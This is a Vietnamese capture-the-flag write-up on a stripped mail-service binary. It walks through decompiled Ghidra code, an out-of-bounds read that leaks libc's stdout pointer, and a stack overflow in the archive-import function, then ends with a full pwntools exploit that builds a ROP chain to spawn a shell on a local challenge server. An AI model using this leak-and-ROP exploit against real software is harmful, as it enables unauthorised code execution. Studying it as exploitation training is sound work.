##  **Kiểm tra thông tin cơ bản và cơ chế bảo vệ**
![[Pasted image 20260915124817.png]]
## **Phân tích**
Giờ ta sẽ đưa file vào ghidra để phân tích, do file đã bị stripped nên sau một hồi khôi phục ta sẽ có cấu trúc hàm main cơ bản như sau:
```c 
undefined8 main(void)
{
  undefined4 uVar1;
  
  init();
  do {
    menu();
    uVar1 = mail_read_int();
    switch(uVar1) {
    default:
      mail_print("Unknown option\n");
      break;
    case 1:
      compose();
      break;
    case 2:
      view();
      break;
    case 3:
      read();
      break;
    case 4:
      archiver();
      break;
    case 5:
      view_ar();
      break;
    case 6:
      import_ar();
      break;
    case 7:
      delete_mail();
      break;
    case 8:
      mail_print("Goodbye\n");
      return 0;
    }
  } while( true );
}
 ```
 Hàm compose có cấu trúc như sau: 
``` c

void compose(void)

{
  My_struct *puVar1;
  
  puVar1 = (My_struct *)create_mail();
  if (puVar1 == (My_struct *)0x0) {
    mail_print("Mailbox full\n");
  }
  else {
    mail_print("Sender: ");
    read_line(puVar1->Sender,0x30);
    mail_print("Recipient: ");
    read_line(puVar1->Recipient,0x30);
    mail_print("Subject: ");
    read_line(puVar1->Subject,0x60);
    mail_print("Body: ");
    read_line(puVar1->Body,0x100);
    mail_print("Mail queued as id ");
    print_int(puVar1->ver);
    mail_print("\n");
  }
  return;
}
```
Sau đó cùng xem hàm `create_mail`:
``` c
My_struct * create_mail(void)

{
  int iVar1;
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (0xf < local_c) {
      return (My_struct *)0x0;
    }
    if (mail_id[local_c] == false) break;
    local_c += 1;
  }
  mail_bzero(Mail_obj + local_c,0x1c8);
  iVar1 = count + 1;
  Mail_obj[local_c].ver = count;
  count = iVar1;
  Mail_obj[local_c].Nones[0] = '\0';
  Mail_obj[local_c].fd = stdout;
  mail_id[local_c] = true;
  return Mail_obj + local_c;
}

```
Từ 2 hàm trên ta có thể suy luận `struct` của đối tượng được tạo có dạng như sau:
```c
My_struct Mail_obj {
    int ver; // 4 byte
    byte Nones; // 1 byte
    char Sender[0x30]; // 0x30 byte
    char Recipient[0x30]; // 0x30 byte
    char Subject[0x60]; // 0x60 byte
	char Body[0x100]; // 0x100 byte
	undefined3 obj; // 3 byte không xác định
    FILE * fd; // 8 byte
}
```
Giờ cùng nhìn qua hàm `read`: 
```c
void read(void)
{
  int iVar1;
  My_struct *lVar2;
  mail_print("Mail id: ");
  iVar1 = mail_read_int();
  if (iVar1 < 1) {
    mail_print("Invalid mail id\n");
  }
  else {
    lVar2 = (My_struct *)find_mail(iVar1);
    if (lVar2 == (My_struct *)0x0) {
      mail_print("Invalid mail id\n");
    }
    else {
      mail_print("From: ");
      mail_print(lVar2->Sender);
      mail_print("\nTo: ");
      mail_print(lVar2->Recipient);
      mail_print("\nSubject: ");
      mail_print(lVar2->Subject);
      mail_print("\nBody:\n");
      mail_write(1,lVar2->Body,0x110);
      mail_print("\n");
    }
  }
  return;
```
Ta cũng sẽ đọc hàm `mail_print` trong file `libmailio.so`:
```c
void mail_print(long param_1)

{
  undefined8 uVar1;
  
  if (param_1 != 0) {
    uVar1 = mail_strlen(param_1);
    mail_write(1,param_1,uVar1);
  }
  return;
}

```
Tiếp đó là `mail_strlen` trong `libmailstr.so`:
```c
long mail_strlen(long param_1)
{
  undefined8 local_10;
  local_10 = 0;
  if (param_1 == 0) {
    local_10 = 0;
  }
  else {
    for (; *(char *)(local_10 + param_1) != '\0'; local_10 += 1) {
    }
  }
  return local_10;
}
```
Về cơ bản nó hoạt động như những hàm bình thường khác mà chúng ta từng biết, nếu bạn nghĩ rằng chúng ta có thể đọc được những thông tin hữu ích khi mà `mail_strlen` lấy size phụ thuộc vào '\x00' thì bạn đừng quên, struct của chúng ta còn có 3 byte null sẽ ngăn điều đó xảy ra: 
```c
My_struct Mail_obj {
    int ver; // 4 byte
    byte Nones; // 1 byte
    char Sender[0x30]; // 0x30 byte
    char Recipient[0x30]; // 0x30 byte
    char Subject[0x60]; // 0x60 byte
	char Body[0x100]; // 0x100 byte
	undefined3 obj; // 3 byte không xác định
    FILE * fd; // 8 byte
}
```
Giờ quay lại hàm `read` và nhìn vào dòng cuối: 
```c
      mail_print("\nBody:\n");
      mail_write(1,lVar2->Body,0x110);
```
Trong khi kích thước của Body có 0x100 nhưng ta lại có thể đọc được 0x110, hàm mail_writen sẽ có cấu trúc như sau:
```c
void mail_write(uint param_1,undefined8 param_2,undefined8 param_3)

{
  syscall(1,(ulong)param_1,param_2,param_3);
  return;
}
```
Điều đó đồng nghĩa với việc nó sẽ in ra đúng 0x110, nhờ đó ta có thể đọc được giá trị của con trỏ `stdout` đã được gắn khi khởi tạo mail. Giờ chúng ta hãy nhìn qua hàm `import_ar`: 
```c
void import_ar(void)

{
  ushort uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  long lVar5;
  My_struct *puVar6;
  ulong uVar6;
  long in_FS_OFFSET;
  char local_1d;
  char local_1c;
  char local_1b;
  char local_1a;
  char local_19;
  undefined1 auStack_18 [2];
  undefined1 auStack_16 [2];
  undefined1 auStack_14 [2];
  undefined1 auStack_12 [2];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  mail_print("Paste archive blob:\n");
  lVar5 = mail_read(0,&local_1d,0xd);
  if (lVar5 == 0xd) {
    if ((((local_1d == 'M') && (local_1c == 'A')) && (local_1b == 'I')) && ((local_1a == 'L' && (local_19 == '\x01')))) {
      uVar1 = get_data(auStack_18);
      uVar2 = get_data(auStack_16);
      uVar3 = get_data(auStack_14);
      uVar4 = get_data(auStack_12);
      if ((uVar1 < 0x31) && ((uVar2 < 0x31 && (uVar3 < 0x61)))) {
        puVar6 = (My_struct *)create_mail();
        if (puVar6 == (My_struct *)0x0) {
          mail_print("Mailbox full\n");
        }
        else {
          if (uVar1 != 0) {
            uVar6 = mail_read(0,puVar6->Sender,uVar1);
            if (uVar6 != uVar1) {
              delete(puVar6);
              mail_print("Invalid archive\n");
              goto LAB_001025f7;
            }
          }
          if (uVar1 < 0x30) {
            puVar6->Sender[(int)(uint)uVar1] = '\0';
          }
          if (uVar2 != 0) {
            uVar6 = mail_read(0,puVar6->Recipient,uVar2);
            if (uVar6 != uVar2) {
              delete(puVar6);
              mail_print("Invalid archive\n");
              goto LAB_001025f7;
            }
          }
          if (uVar2 < 0x30) {
            puVar6->Recipient[(int)(uint)uVar2] = '\0';
          }
          if (uVar3 != 0) {
            uVar6 = mail_read(0,puVar6->Subject,uVar3);
            if (uVar6 != uVar3) {
              delete(puVar6);
              mail_print("Invalid archive\n");
              goto LAB_001025f7;
            }
          }
          if (uVar3 < 0x60) {
            puVar6->Subject[(int)(uint)uVar3] = '\0';
          }
          uVar6 = mail_read_data(0,puVar6->Body,uVar4);
          if ((long)uVar6 < 0) {
            delete(puVar6);
            mail_print("Invalid archive\n");
          }
          else {
            if (((uVar4 < 0x100) && (-1 < (long)uVar6)) && (uVar6 < 0x100)) {
              puVar6->Body[uVar6] = '\0';
            }
            mail_print("Imported as id ");
            print_int(puVar6->ver);
            mail_print("\n");
          }
        }
      }
      else {
        mail_print("Invalid archive\n");
      }
    }
    else {
      mail_print("Invalid archive\n");
    }
  }
  else {
    mail_print("Invalid archive\n");
  }
LAB_001025f7:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Cơ bản là hàm cho phép ta tạo một mail mới với kích thước do ta quyết định. Nhưng ở đây có một điều bất thường khi hàm tiến hành ghi dữ liệu vào biến `Body`
```c
          uVar6 = mail_read_data(0,puVar6->Body,uVar4);
```
Khi mà tất cả kiểu dữ liệu khác đều kiểm tra kích thước trước khi ghi nhưng `Body` thì lại không, đây là một lỗ hổng khá tiềm năng, giờ cùng nhìn hàm `mail_read_data` trong `libmailio.so` có cấu trúc như thế nào:
```c
long mail_read_data(undefined4 param_1,long param_2,undefined8 param_3)

{
  undefined1 local_98 [136];
  long local_10;
  
  if (param_2 == 0) {
    local_10 = -1;
  }
  else {
    local_10 = mail_read(param_1,local_98,param_3);
    if (0 < local_10) {
      mail_memcpy(param_2,local_98,local_10);
    }
  }
  return local_10;
}
```
và sau đó là `mail_read`:
```c
void mail_read(uint param_1,undefined8 param_2,undefined8 param_3)

{
  syscall(0,(ulong)param_1,param_2,param_3);
  return;
}
```
Hàm `import_ar` và `mail_read_data` thiếu cơ chế kiểm tra giới hạn đầu vào (bounds checking), dẫn đến lỗ hổng SBO. Bằng cách tận dụng lỗi này cùng với giá trị con trỏ `stdout` leak từ hàm `read`, ta có đủ điều kiện để thực thi ROP chain và gọi `system('/bin/sh')`.
## **Ý tưởng khai thác**
Đầu tiên ta sẽ khởi tạo một mail mới để con trỏ `fd` được gắn `stdout` và tận dụng hàm `read` để leak giá trị của `stdout`, chính là `_IO_2_1_stdout_` trong file `libc.so.6` nhờ đó ta có thể tính toán được base_libc. 
![[Pasted image 20260915135054.png]]
Sau đó ta gọi hàm `import_ar`, bằng việc kiểm soát kích thước của `Body`, ta sẽ gửi payload để gọi hàm `system('/bin/sh')` thông qua ROP chain cơ bản như sau: 
`Payload = [Padding] + ret + pop_rdi + addr_bin_sh + addr_system`
```python
#!/usr/bin/env python3

from pwn import *
elf = ELF('./mail_service_patched')
libc = ELF('./libc.so.6')
context.binary = elf
def main():
    p = remote('127.0.0.1',1337)
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b': ',b'1')
    p.recvuntil(b'Body:\n')
    ar_stdout = u64(p.recv(0x110)[0x103:0x10b])
    print(f'stdout = {hex(ar_stdout)}')
    libc.address = ar_stdout - libc.sym['_IO_2_1_stdout_']
    print(hex(libc.address))
    rop = ROP(libc)
    shell = b'a'*3+0x98*b'a'+ p64(rop.find_gadget(['ret'])[0]) + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']) 
    size = 0x98 + 8*4
    p.sendlineafter(b'> ',b'6')
    p.sendafter(b'Paste archive blob:\n',b'MAIL\x01'+3*p16(1) + p16(size))
    p.send(shell)
    p.interactive()
    p.close()

if __name__ == "__main__":
    main()

```
![[Pasted image 20260915140340.png]]